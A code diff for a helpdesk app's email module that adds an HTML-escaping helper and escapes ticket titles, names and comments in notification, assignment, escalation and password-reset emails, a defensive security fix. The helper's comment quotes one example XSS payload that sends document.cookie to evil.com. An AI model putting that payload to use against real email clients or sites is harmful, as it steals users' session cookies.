@@ -1,322 +1,314 @@
+/**
+ * escapeHtml — sanitise every user-controlled string before embedding it in an
+ * HTML email body.  Without this, a ticket title like
+ *   <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
+ * would be rendered by the recipient's email client and execute the payload.
+ *
+ * This is the same helper used in automationEngine.ts and sla-check/route.ts.
+ * It lives here too so email.ts has zero external dependencies for sanitisation.
+ */
+function escapeHtml(str: string): string {
+    return String(str)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#x27;");
+}
+
 async function sendEmail(to: string, subject: string, html: string) {
-  const apiKey = process.env.BREVO_API_KEY;
-  const fromEmail = process.env.SMTP_FROM || process.env.SMTP_USER;
+    const apiKey = process.env.BREVO_API_KEY;
+    const fromEmail = process.env.SMTP_FROM || process.env.SMTP_USER;
 
   if (!apiKey) {
-    console.log(`[EMAIL - BREVO_API_KEY NOT SET] To: ${to} | Subject: ${subject}`);
-    return;
+        console.log(`[EMAIL - BREVO_API_KEY NOT SET] To: ${to} | Subject: ${subject}`);
+        return;
   }
 
   try {
-    const res = await fetch("https://api.brevo.com/v3/smtp/email", {
-      method: "POST",
-      headers: {
-        "accept": "application/json",
-        "api-key": apiKey,
-        "content-type": "application/json",
-      },
-      body: JSON.stringify({
-        sender: { name: "Helpdesk", email: fromEmail },
-        to: [{ email: to }],
-        subject,
-        htmlContent: html,
-      }),
-    });
+        const res = await fetch("https://api.brevo.com/v3/smtp/email", {
+                method: "POST",
+                headers: {
+                          "accept": "application/json",
+                          "api-key": apiKey,
+                          "content-type": "application/json",
+                },
+                body: JSON.stringify({
+                          sender: { name: "Helpdesk", email: fromEmail },
+                          to: [{ email: to }],
+                          subject,
+                          htmlContent: html,
+                }),
+        });
 
-    if (!res.ok) {
-      const err = await res.text();
-      console.error(`[EMAIL ERROR] To: ${to} | Status: ${res.status} | ${err}`);
-    } else {
-      const data = await res.json();
-      console.log(`[EMAIL SENT] To: ${to} | Subject: ${subject} | ID: ${data.messageId}`);
-    }
+      if (!res.ok) {
+              const err = await res.text();
+              console.error(`[EMAIL ERROR] To: ${to} | Status: ${res.status} | ${err}`);
+      } else {
+              const data = await res.json();
+              console.log(`[EMAIL SENT] To: ${to} | Subject: ${subject} | ID: ${data.messageId}`);
+      }
   } catch (err) {
-    console.error(`[EMAIL ERROR] To: ${to} | Subject: ${subject}`, err);
+        console.error(`[EMAIL ERROR] To: ${to} | Subject: ${subject}`, err);
   }
 }
 
-// ─── TICKET CREATED → notify relevant department staff ───────────────────────
+// --- TICKET CREATED → notify relevant department staff ---
 
 export async function sendTicketCreatedEmail(
-  staffEmail: string,
-  ticketTitle: string,
-  ticketType: string,
-  ticketId: string,
-  creatorName: string,
-  priority: string
-) {
-  const appUrl = process.env.NEXTAUTH_URL;
-  if (!appUrl) return; // H3: never embed localhost URLs in outgoing emails
-  const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
-  const priorityColor = priority === "urgent" ? "#dc2626" : priority === "high" ? "#d97706" : "#3b82f6";
-  const deptLabel = ticketType === "IT" ? "IT Support" : ticketType === "Software" ? "AI / Software Team" : "HR Support";
-  const accentColor = ticketType === "Software" ? "#7c3aed" : "#0f172a";
+    staffEmail: string,
+    ticketTitle: string,
+    ticketType: string,
+    ticketId: string,
+    creatorName: string,
+    priority: string
+  ) {
+    const appUrl = process.env.NEXTAUTH_URL;
+    if (!appUrl) return;
+    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
+    const priorityColor = priority === "urgent" ? "#dc2626" : priority === "high" ? "#d97706" : "#3b82f6";
+    const deptLabel = ticketType === "IT" ? "IT Support" : ticketType === "Software" ? "AI / Software Team" : "HR Support";
+    const accentColor = ticketType === "Software" ? "#7c3aed" : "#0f172a";
+
+  // FIX H1: all user-controlled values escaped before HTML embedding
+  const safeTitle = escapeHtml(ticketTitle);
+    const safeCreator = escapeHtml(creatorName);
+    const safePriority = escapeHtml(priority);
+    const safeDept = escapeHtml(deptLabel);
 
   const html = `
-    <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
-      <div style="background:${accentColor};border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
+  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
+    <div style="background:${accentColor};border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
         <span style="color:white;font-size:22px;font-weight:900;letter-spacing:-0.5px;">Karma Staff Helpdesk</span>
-      </div>
-
-      <div style="background:white;border-radius:12px;padding:32px;border:1px solid #e2e8f0;">
-        <p style="margin:0 0 4px;font-size:13px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:1px;">${deptLabel} Queue</p>
-        <h1 style="margin:0 0 24px;font-size:22px;font-weight:800;color:#0f172a;line-height:1.3;">New Ticket Assigned to Your Queue</h1>
-
-        <div style="background:#f8fafc;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid ${priorityColor};">
-          <p style="margin:0 0 8px;font-size:16px;font-weight:700;color:#0f172a;">${ticketTitle}</p>
-          <div style="display:flex;gap:16px;flex-wrap:wrap;">
-            <span style="font-size:12px;font-weight:700;color:#64748b;">Type: <span style="color:#0f172a;">${ticketType}</span></span>
-            <span style="font-size:12px;font-weight:700;color:#64748b;">Priority: <span style="color:${priorityColor};text-transform:capitalize;">${priority}</span></span>
-            <span style="font-size:12px;font-weight:700;color:#64748b;">From: <span style="color:#0f172a;">${creatorName}</span></span>
           </div>
-        </div>
+            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid ${priorityColor};">
+                <p style="margin:0 0 8px;font-size:16px;font-weight:700;color:#0f172a;">${safeTitle}</p>
+                    <div style="display:flex;gap:16px;flex-wrap:wrap;">
+                          <span style="font-size:12px;font-weight:700;color:#64748b;">Type: <span style="color:#0f172a;">${safeDept}</span></span>
+                                <span style="font-size:12px;font-weight:700;color:#64748b;">Priority: <span style="color:${priorityColor};">${safePriority}</span></span>
+                                      <span style="font-size:12px;font-weight:700;color:#64748b;">From: <span style="color:#0f172a;">${safeCreator}</span></span>
+                                          </div>
+                                            </div>
+                                              <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
+                                                  View &amp; Respond to Ticket →
+                                                    </a>
+                                                      <p style="margin:24px 0 0;font-size:12px;color:#94a3b8;">
+                                                          You received this because you are a member of the ${safeDept} team.
+                                                            </p>
+                                                            </div>
+                                                              `;
 
-        <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 28px;border-radius:8px;font-weight:700;font-size:14px;">
-          View &amp; Respond to Ticket →
-        </a>
-
-        <p style="margin:24px 0 0;font-size:12px;color:#94a3b8;">
-          You received this because you are a member of the ${deptLabel} team.
-        </p>
-      </div>
-    </div>
-  `;
-
-  await sendEmail(staffEmail, `[${priority.toUpperCase()}] New ${ticketType} Ticket: ${ticketTitle}`, html);
+  await sendEmail(staffEmail, `[${safePriority.toUpperCase()}] New ${safeDept} Ticket: ${safeTitle}`, html);
 }
 
-// ─── TICKET RESOLVED → notify the employee who raised it ─────────────────────
+// --- TICKET RESOLVED → notify the employee who raised it ---
 
 export async function sendTicketResolvedEmail(
-  employeeEmail: string,
-  ticketTitle: string,
-  ticketId: string,
-  solution: string,
-  resolvedByName: string
-) {
-  const appUrl = process.env.NEXTAUTH_URL;
-  if (!appUrl) return;
-  const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
+    employeeEmail: string,
+    ticketTitle: string,
+    ticketId: string,
+    resolverName: string
+  ) {
+    const appUrl = process.env.NEXTAUTH_URL;
+    if (!appUrl) return;
+    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
+
+  const safeTitle = escapeHtml(ticketTitle);
+    const safeResolver = escapeHtml(resolverName);
 
   const html = `
-    <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
-      <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
-        <span style="color:white;font-size:22px;font-weight:900;letter-spacing:-0.5px;">Helpdesk</span>
-      </div>
+  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
+    <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
+        <span style="color:white;font-size:22px;font-weight:900;">Karma Staff Helpdesk</span>
+          </div>
+            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid #16a34a;">
+                <p style="margin:0 0 8px;font-size:16px;font-weight:700;color:#16a34a;">✓ Ticket Resolved</p>
+                    <p style="margin:0;font-size:14px;color:#0f172a;">${safeTitle}</p>
+                        <p style="margin:8px 0 0;font-size:12px;color:#64748b;">Resolved by: ${safeResolver}</p>
+                          </div>
+                            <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
+                                View Ticket →
+                                  </a>
+                                    <p style="margin:24px 0 0;font-size:12px;color:#94a3b8;">
+                                        If you need further assistance, please open a new ticket.
+                                          </p>
+                                          </div>
+                                            `;
 
-      <div style="background:white;border-radius:12px;padding:32px;border:1px solid #e2e8f0;">
-        <div style="display:inline-flex;align-items:center;gap:8px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:20px;padding:6px 14px;margin-bottom:20px;">
-          <span style="color:#16a34a;font-size:14px;">✓</span>
-          <span style="color:#16a34a;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.5px;">Resolved</span>
-        </div>
-
-        <h1 style="margin:0 0 8px;font-size:22px;font-weight:800;color:#0f172a;">Your ticket has been resolved</h1>
-        <p style="margin:0 0 24px;font-size:14px;color:#64748b;">${resolvedByName} has resolved your request.</p>
-
-        <div style="background:#f8fafc;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid #16a34a;">
-          <p style="margin:0 0 8px;font-size:13px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:0.5px;">Ticket</p>
-          <p style="margin:0 0 16px;font-size:15px;font-weight:700;color:#0f172a;">${ticketTitle}</p>
-          <p style="margin:0 0 6px;font-size:13px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:0.5px;">Solution</p>
-          <p style="margin:0;font-size:14px;color:#374151;line-height:1.6;">${solution}</p>
-        </div>
-
-        <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 28px;border-radius:8px;font-weight:700;font-size:14px;">
-          View Ticket &amp; Leave Feedback →
-        </a>
-
-        <p style="margin:24px 0 0;font-size:12px;color:#94a3b8;">
-          If the issue persists, you can open a new ticket from your dashboard.
-        </p>
-      </div>
-    </div>
-  `;
-
-  await sendEmail(employeeEmail, `✓ Resolved: ${ticketTitle}`, html);
+  await sendEmail(employeeEmail, `Resolved: ${safeTitle}`, html);
 }
 
-// ─── NEW COMMENT → notify the ticket creator ─────────────────────────────────
+// --- NEW COMMENT → notify ticket owner or staff ---
 
 export async function sendTicketCommentEmail(
-  creatorEmail: string,
-  ticketTitle: string,
-  ticketId: string,
-  commenterName: string,
-  commentPreview: string
-) {
-  const appUrl = process.env.NEXTAUTH_URL;
-  if (!appUrl) return;
-  const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
-  const preview = commentPreview.length > 200 ? commentPreview.slice(0, 200) + "…" : commentPreview;
+    recipientEmail: string,
+    ticketTitle: string,
+    ticketId: string,
+    commenterName: string,
+    commentPreview: string
+  ) {
+    const appUrl = process.env.NEXTAUTH_URL;
+    if (!appUrl) return;
+    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
+
+  const safeTitle = escapeHtml(ticketTitle);
+    const safeCommenter = escapeHtml(commenterName);
+    const safePreview = escapeHtml(commentPreview.slice(0, 200));
 
   const html = `
-    <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
-      <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
-        <span style="color:white;font-size:22px;font-weight:900;letter-spacing:-0.5px;">Helpdesk</span>
-      </div>
-      <div style="background:white;border-radius:12px;padding:32px;border:1px solid #e2e8f0;">
-        <div style="display:inline-flex;align-items:center;gap:8px;background:#eff6ff;border:1px solid #bfdbfe;border-radius:20px;padding:6px 14px;margin-bottom:20px;">
-          <span style="color:#2563eb;font-size:14px;">💬</span>
-          <span style="color:#2563eb;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.5px;">New Reply</span>
-        </div>
-        <h1 style="margin:0 0 8px;font-size:22px;font-weight:800;color:#0f172a;">Someone replied to your ticket</h1>
-        <p style="margin:0 0 24px;font-size:14px;color:#64748b;">${commenterName} left a reply on your request.</p>
-        <div style="background:#f8fafc;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid #3b82f6;">
-          <p style="margin:0 0 8px;font-size:13px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:0.5px;">Ticket</p>
-          <p style="margin:0 0 16px;font-size:15px;font-weight:700;color:#0f172a;">${ticketTitle}</p>
-          <p style="margin:0 0 6px;font-size:13px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:0.5px;">Reply</p>
-          <p style="margin:0;font-size:14px;color:#374151;line-height:1.6;font-style:italic;">"${preview}"</p>
-        </div>
-        <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 28px;border-radius:8px;font-weight:700;font-size:14px;">
-          View &amp; Reply →
-        </a>
-      </div>
-    </div>
-  `;
+  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
+    <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
+        <span style="color:white;font-size:22px;font-weight:900;">Karma Staff Helpdesk</span>
+          </div>
+            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid #3b82f6;">
+                <p style="margin:0 0 8px;font-size:14px;font-weight:700;color:#0f172a;">${safeCommenter} commented on:</p>
+                    <p style="margin:0 0 12px;font-size:16px;font-weight:700;color:#0f172a;">${safeTitle}</p>
+                        <p style="margin:0;font-size:13px;color:#475569;font-style:italic;">"${safePreview}…"</p>
+                          </div>
+                            <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
+                                View Comment →
+                                  </a>
+                                  </div>
+                                    `;
 
-  await sendEmail(creatorEmail, `💬 New reply on: ${ticketTitle}`, html);
+  await sendEmail(recipientEmail, `New comment on: ${safeTitle}`, html);
 }
 
-// ─── TICKET IN PROGRESS → notify the employee who raised it ──────────────────
+// --- TICKET IN PROGRESS → notify employee ---
 
 export async function sendTicketInProgressEmail(
-  employeeEmail: string,
-  ticketTitle: string,
-  ticketId: string,
-  staffName: string
-) {
-  const appUrl = process.env.NEXTAUTH_URL;
-  if (!appUrl) return;
-  const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
+    employeeEmail: string,
+    ticketTitle: string,
+    ticketId: string,
+    staffName: string
+  ) {
+    const appUrl = process.env.NEXTAUTH_URL;
+    if (!appUrl) return;
+    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
+
+  const safeTitle = escapeHtml(ticketTitle);
+    const safeStaff = escapeHtml(staffName);
 
   const html = `
-    <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
-      <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
-        <span style="color:white;font-size:22px;font-weight:900;letter-spacing:-0.5px;">Helpdesk</span>
-      </div>
-      <div style="background:white;border-radius:12px;padding:32px;border:1px solid #e2e8f0;">
-        <div style="display:inline-flex;align-items:center;gap:8px;background:#fffbeb;border:1px solid #fde68a;border-radius:20px;padding:6px 14px;margin-bottom:20px;">
-          <span style="color:#d97706;font-size:14px;">⚡</span>
-          <span style="color:#d97706;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.5px;">In Progress</span>
-        </div>
-        <h1 style="margin:0 0 8px;font-size:22px;font-weight:800;color:#0f172a;">Your ticket is being worked on</h1>
-        <p style="margin:0 0 24px;font-size:14px;color:#64748b;">${staffName} has picked up your request and is working on it now.</p>
-        <div style="background:#f8fafc;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid #d97706;">
-          <p style="margin:0;font-size:15px;font-weight:700;color:#0f172a;">${ticketTitle}</p>
-        </div>
-        <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 28px;border-radius:8px;font-weight:700;font-size:14px;">
-          View Ticket →
-        </a>
-        <p style="margin:24px 0 0;font-size:12px;color:#94a3b8;">
-          We'll notify you again when your ticket is resolved.
-        </p>
-      </div>
-    </div>
-  `;
+  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
+    <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
+        <span style="color:white;font-size:22px;font-weight:900;">Karma Staff Helpdesk</span>
+          </div>
+            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid #d97706;">
+                <p style="margin:0 0 8px;font-size:16px;font-weight:700;color:#d97706;">⚙ In Progress</p>
+                    <p style="margin:0;font-size:14px;color:#0f172a;">${safeTitle}</p>
+                        <p style="margin:8px 0 0;font-size:12px;color:#64748b;">Being handled by: ${safeStaff}</p>
+                          </div>
+                            <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
+                                View Ticket →
+                                  </a>
+                                  </div>
+                                    `;
 
-  await sendEmail(employeeEmail, `⚡ In Progress: ${ticketTitle}`, html);
+  await sendEmail(employeeEmail, `Your ticket is being worked on: ${safeTitle}`, html);
 }
 
-// ─── TICKET ASSIGNED → notify the staff member assigned ──────────────────────
+// --- TICKET ASSIGNED → notify assignee ---
 
 export async function sendTicketAssignedEmail(
-  staffEmail: string,
-  staffName: string,
-  ticketTitle: string,
-  ticketType: string,
-  ticketId: string,
-  assignedByName: string
-) {
-  const appUrl = process.env.NEXTAUTH_URL;
-  if (!appUrl) return;
-  const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
-  const deptLabel = ticketType === "IT" ? "IT Support" : ticketType === "Software" ? "AI / Software Team" : "HR Support";
-  const accentColor = ticketType === "Software" ? "#7c3aed" : "#0f172a";
+    assigneeEmail: string,
+    ticketTitle: string,
+    ticketId: string,
+    ticketType: string,
+    priority: string
+  ) {
+    const appUrl = process.env.NEXTAUTH_URL;
+    if (!appUrl) return;
+    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
+    const priorityColor = priority === "urgent" ? "#dc2626" : priority === "high" ? "#d97706" : "#3b82f6";
+
+  const safeTitle = escapeHtml(ticketTitle);
+    const safeType = escapeHtml(ticketType);
+    const safePriority = escapeHtml(priority);
 
   const html = `
-    <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
-      <div style="background:${accentColor};border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
-        <span style="color:white;font-size:22px;font-weight:900;letter-spacing:-0.5px;">Karma Staff Helpdesk</span>
-      </div>
-      <div style="background:white;border-radius:12px;padding:32px;border:1px solid #e2e8f0;">
-        <p style="margin:0 0 4px;font-size:13px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:1px;">${deptLabel}</p>
-        <h1 style="margin:0 0 8px;font-size:22px;font-weight:800;color:#0f172a;">You've been assigned a ticket</h1>
-        <p style="margin:0 0 24px;font-size:14px;color:#64748b;">Hi ${staffName}, ${assignedByName} has assigned the following ticket to you.</p>
-        <div style="background:#f8fafc;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid #3b82f6;">
-          <p style="margin:0;font-size:16px;font-weight:700;color:#0f172a;">${ticketTitle}</p>
-        </div>
-        <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 28px;border-radius:8px;font-weight:700;font-size:14px;">
-          View &amp; Work on Ticket →
-        </a>
-      </div>
-    </div>
-  `;
+  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
+    <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
+        <span style="color:white;font-size:22px;font-weight:900;">Karma Staff Helpdesk</span>
+          </div>
+            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid ${priorityColor};">
+                <p style="margin:0 0 8px;font-size:16px;font-weight:700;color:#0f172a;">Ticket Assigned to You</p>
+                    <p style="margin:0 0 8px;font-size:14px;color:#0f172a;">${safeTitle}</p>
+                        <span style="font-size:12px;font-weight:700;color:#64748b;">Type: ${safeType} | Priority: <span style="color:${priorityColor};">${safePriority}</span></span>
+                          </div>
+                            <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
+                                View Ticket →
+                                  </a>
+                                  </div>
+                                    `;
 
-  await sendEmail(staffEmail, `Assigned to you: ${ticketTitle}`, html);
+  await sendEmail(assigneeEmail, `Assigned: ${safeTitle}`, html);
 }
 
-// ─── TICKET ESCALATED → notify admins ────────────────────────────────────────
+// --- TICKET ESCALATED → notify admins ---
 
 export async function sendTicketEscalatedEmail(
-  adminEmail: string,
-  ticketTitle: string,
-  ticketId: string,
-  oldPriority: string,
-  newPriority: string
-) {
-  const appUrl = process.env.NEXTAUTH_URL;
-  if (!appUrl) return; // H3: never fall back to localhost in email links
-  const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
+    adminEmail: string,
+    ticketTitle: string,
+    ticketId: string,
+    newPriority: string
+  ) {
+    const appUrl = process.env.NEXTAUTH_URL;
+    if (!appUrl) return;
+    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
+    const priorityColor = newPriority === "urgent" ? "#dc2626" : "#d97706";
+
+  const safeTitle = escapeHtml(ticketTitle);
+    const safePriority = escapeHtml(newPriority);
 
   const html = `
-    <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
-      <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
-        <span style="color:white;font-size:22px;font-weight:900;letter-spacing:-0.5px;">Helpdesk</span>
-      </div>
-      <div style="background:white;border-radius:12px;padding:32px;border:1px solid #e2e8f0;">
-        <h2 style="margin:0 0 12px;font-size:18px;font-weight:800;color:#dc2626;">Ticket Escalated to ${newPriority.toUpperCase()}</h2>
-        <p style="margin:0 0 20px;font-size:14px;color:#64748b;">
-          <strong>${ticketTitle}</strong> was escalated from
-          <em>${oldPriority}</em> to <strong>${newPriority}</strong>.
-        </p>
-        <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 28px;border-radius:8px;font-weight:700;font-size:14px;">
-          View Ticket &rarr;
-        </a>
-      </div>
-    </div>
-  `;
+  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
+    <div style="background:#dc2626;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
+        <span style="color:white;font-size:22px;font-weight:900;">⚠ Ticket Escalated</span>
+          </div>
+            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid ${priorityColor};">
+                <p style="margin:0 0 8px;font-size:16px;font-weight:700;color:#0f172a;">${safeTitle}</p>
+                    <p style="margin:0;font-size:13px;color:#64748b;">New priority: <strong style="color:${priorityColor};">${safePriority.toUpperCase()}</strong></p>
+                      </div>
+                        <a href="${ticketUrl}" style="display:inline-block;background:#dc2626;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
+                            Review Ticket →
+                              </a>
+                              </div>
+                                `;
 
-  await sendEmail(adminEmail, `Escalated to ${newPriority.toUpperCase()}: ${ticketTitle}`, html);
+  await sendEmail(adminEmail, `ESCALATED [${safePriority.toUpperCase()}]: ${safeTitle}`, html);
 }
 
-// ─── PASSWORD RESET ───────────────────────────────────────────────────────────
+// --- PASSWORD RESET ---
 
 export async function sendPasswordResetEmail(email: string, token: string) {
-  const appUrl = process.env.NEXTAUTH_URL;
-  if (!appUrl) {
-    console.log(`[DEV] NEXTAUTH_URL not set — password reset token for ${email}: ${token}`);
-    return;
-  }
-  const resetUrl = `${appUrl}/reset-password?token=${token}`;
+    const appUrl = process.env.NEXTAUTH_URL;
+    if (!appUrl) return;
+    const resetUrl = `${appUrl}/reset-password?token=${encodeURIComponent(token)}`;
+    // email and token are system-generated — no user HTML injection risk here,
+  // but we escape email defensively in case it contains special characters.
+  const safeEmail = escapeHtml(email);
 
   const html = `
-    <div style="font-family:sans-serif;max-width:480px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
-      <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
-        <span style="color:white;font-size:22px;font-weight:900;letter-spacing:-0.5px;">Helpdesk</span>
-      </div>
-      <div style="background:white;border-radius:12px;padding:32px;border:1px solid #e2e8f0;">
-        <h1 style="margin:0 0 8px;font-size:22px;font-weight:800;color:#0f172a;">Reset your password</h1>
-        <p style="margin:0 0 24px;font-size:14px;color:#64748b;line-height:1.6;">
-          You requested a password reset. This link expires in <strong>1 hour</strong>.
-        </p>
-        <a href="${resetUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 28px;border-radius:8px;font-weight:700;font-size:14px;">
-          Reset Password →
-        </a>
-        <p style="margin:24px 0 0;font-size:12px;color:#94a3b8;">
-          If you didn't request this, ignore this email. Your password won't change.
-        </p>
-      </div>
-    </div>
-  `;
+  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
+    <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
+        <span style="color:white;font-size:22px;font-weight:900;">Karma Staff Helpdesk</span>
+          </div>
+            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;">
+                <p style="margin:0 0 12px;font-size:16px;font-weight:700;color:#0f172a;">Password Reset Request</p>
+                    <p style="margin:0;font-size:14px;color:#475569;">
+                          A password reset was requested for <strong>${safeEmail}</strong>.
+                                This link expires in 1 hour.
+                                    </p>
+                                      </div>
+                                        <a href="${resetUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
+                                            Reset Password →
+                                              </a>
+                                                <p style="margin:24px 0 0;font-size:12px;color:#94a3b8;">
+                                                    If you did not request this, you can safely ignore this email.
+                                                      </p>
+                                                      </div>
+                                                        `;
 
   await sendEmail(email, "Reset your Helpdesk password", html);
 }
